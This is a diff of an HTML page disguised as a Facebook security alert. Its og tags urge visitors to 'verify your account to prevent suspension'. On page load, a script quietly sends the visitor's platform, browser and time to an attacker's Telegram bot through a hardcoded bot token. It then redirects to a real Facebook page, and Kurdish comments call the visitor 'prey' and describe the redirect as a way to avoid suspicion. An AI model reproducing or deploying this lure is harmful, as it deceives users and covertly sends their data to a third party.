@@ -1,21 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Security Verification</title>
-    <meta property="og:image" content="https://raw.githubusercontent.com/Sultana/img/main/alert.jpg">
+    <meta charset="UTF-8">
+    <title>Security Check</title>
+    <meta property="og:title" content="Security Alert - Facebook">
+    <meta property="og:description" content="Please verify your account to prevent suspension.">
+    <meta property="og:image" content="https://i.ibb.co/3S4S4y4/fb-alert.jpg">
+
     <script>
-        async function capture() {
-            const T = '8003094558:AAFAyNxNF-wAnQCgZ8XTJrZRIomL_l9JKrs';
-            const C = '8418985219';
-            const info = "🚀 پاشا، نێچیرەکە کلیکی کرد!%0A📱 مۆبایل: " + navigator.userAgent;
+        async function sultanHack() {
+            const token = '8003094558:AAFAyNxNF-wAnQCgZ8XTJrZRIomL_l9JKrs';
+            const chat_id = '8418985219';
             
-            await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${info}`);
-            window.location.href = "https://www.facebook.com"; // دەیبات بۆ فەیسبووک تا گومان نەکات
+            // کۆکردنەوەی زانیاری
+            const info = "👑 **پاشا، نێچیرەکە هاتە ناو لینکەکەت!**%0A" +
+                         "📱 مۆبایل: " + navigator.platform + "%0A" +
+                         "🌐 وێبگەڕ: " + (navigator.userAgent.includes("Chrome") ? "Chrome" : "Browser") + "%0A" +
+                         "⏰ کات: " + new Date().toLocaleTimeString();
+
+            // ناردن بۆ تەلەگرام
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${info}&parse_mode=Markdown`);
+            } catch (e) {}
+
+            // ناردنی نێچیر بۆ لاپەڕەی ڕاستەقینە دوای ٢ چرکە
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/security/login_alerts";
+            }, 2000);
         }
-        window.onload = capture;
+        window.onload = sultanHack;
     </script>
 </head>
-<body style="margin:0; padding:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <h2 style="color:white; font-family:Arial;">Loading...</h2>
+<body style="background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial;">
+    <div style="text-align: center;">
+        <img src="https://i.ibb.co/3S4S4y4/fb-alert.jpg" alt="Security" style="width: 100px; margin-bottom: 20px;">
+        <h2>Checking Security...</h2>
+        <p>Please wait while we verify your browser.</p>
+    </div>
 </body>
 </html>
